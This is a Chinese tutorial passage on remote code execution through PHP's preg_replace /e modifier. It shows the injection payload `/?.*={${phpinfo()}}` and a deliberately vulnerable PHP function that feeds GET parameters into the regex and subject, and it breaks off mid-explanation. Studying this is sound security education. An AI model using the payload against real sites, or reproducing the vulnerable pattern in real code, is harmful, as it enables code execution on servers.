[TOC]

# 深入研究preg_replace与代码执行

主要是将preg_replace /e 模式下的代码执行问题。

payload:`/?.*={${phpinfo()}}`

## 案例：

```php
header("Content-Type: text/plain");
function complexStrtolower($regex,$value)
{
	return preg_replace('/(' . $regex . ')/ei','strtolower("\\1")',$value);
}
foreach($_GET as $regex=>$value)
{
    echo complexStrtolower($regex,$value)."\n";
}
```

这个案例实际上很简单，就是 **preg_replace** 使用了 **/e** 模式，导致可以代码执行，而且该函数的第一个和第三个参数都是我们可以控制的。我们都知道， **preg_replace** 函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图 **preg_replace** 函数的第二个参数）当做代码来执行，然而这里的第二个参数却固定为 **'strtolower("\\1")'** 字符串，那这样要如何执行代码呢？